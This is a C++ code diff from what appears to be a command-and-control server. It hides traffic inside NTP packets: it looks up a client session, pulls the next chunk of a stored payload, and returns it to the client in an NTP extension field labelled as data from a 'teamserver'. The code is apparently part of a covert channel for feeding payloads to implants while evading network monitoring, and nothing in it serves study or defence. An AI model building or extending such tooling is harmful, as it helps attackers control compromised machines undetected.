@@ -147,6 +147,39 @@ void handle_ntp_packet(char* data, int len, sockaddr_in* client_addr, SOCKET soc
             std::cout << "[?] 0x00 continuation of getting payload" << std::endl;
             
             //access class and get next chunk to send back. client must have req'd 0x86 or 0x64 FIRST, otherwise itll be empty.  
+            //need to figure out class logic to see if a class exists. Maybe a basic factory that searches it or creates one, as a function.
+
+            //need to convert sessionId to uint32 as that's what is hashed
+            uint32_t convertedSessionId;
+            std::memcpy(&convertedSessionId, sessionId.data(), sizeof(convertedSessionId));
+
+            // Attempt to find key
+            auto it = sessions.find(convertedSessionId);
+            if (it != sessions.end()) {
+                //std::cout << "Found: " << it->second << "\n";
+                std::cout << "[?] Class exists for " << convertedSessionId << std::endl;
+                //get next chunk - need to figure otu chunk size here too
+                std::vector<uint8_t> nextChunk = it->second.getNextChunk(4);
+                //send back
+                
+                //craet NTP packet
+                NTPPacket responsePacketClass;
+                responsePacketClass.addExtensionField(
+                    NtpExtensionField::dataFromTeamserver, //is this the best way to get this back? Maybe a dedicated header specifying payload
+                    nextChunk
+                );
+
+                std::vector<uint8_t> responsePacket = responsePacketClass.getPacket();
+
+                sendNtpPacket(client_addr, sock, responsePacket);
+
+
+            }
+            else {
+                std::cout << "[?] Client Class not found!" << std::endl;
+            }
+
+
         }
 
         else {
